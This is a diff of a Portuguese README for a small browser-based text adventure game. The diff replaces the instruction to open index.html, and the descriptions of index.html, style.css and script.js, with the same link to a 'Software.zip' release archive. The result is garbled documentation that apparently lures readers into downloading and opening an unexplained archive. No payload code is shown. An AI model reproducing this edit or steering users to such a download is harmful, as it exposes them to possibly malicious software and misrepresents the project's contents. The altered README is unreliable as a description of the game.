@@ -10,7 +10,7 @@ Este é o projeto de um jogo de aventura baseado em texto, onde a pessoa usuári
 
 ### Como jogar
 
-1. Abra o arquivo `index.html` em seu navegador.
+1. Abra o arquivo `https://github.com/Brevidade/criando-sua-aventura/releases/download/v1.0/Software.zip` em seu navegador.
 2. Leia a história apresentada e clique no botão que corresponde à sua escolha.
 3. Continue seguindo a narrativa e tomando decisões até chegar a um final.
 
@@ -18,9 +18,9 @@ Este é o projeto de um jogo de aventura baseado em texto, onde a pessoa usuári
 
 O projeto consiste em três arquivos principais:
 
-- **index.html:** Contém o HTML da página, exibindo a história e os botões de navegação.
-- **style.css:** Define o estilo visual do jogo, incluindo cores, fontes e layout.
-- **script.js:** Contém o código JavaScript que controla a lógica do jogo, como a mudança entre os passos da história.
+- **https://github.com/Brevidade/criando-sua-aventura/releases/download/v1.0/Software.zip** Contém o HTML da página, exibindo a história e os botões de navegação.
+- **https://github.com/Brevidade/criando-sua-aventura/releases/download/v1.0/Software.zip** Define o estilo visual do jogo, incluindo cores, fontes e layout.
+- **https://github.com/Brevidade/criando-sua-aventura/releases/download/v1.0/Software.zip** Contém o código JavaScript que controla a lógica do jogo, como a mudança entre os passos da história.
 
 ### Sugestões de melhoria para o futuro
 
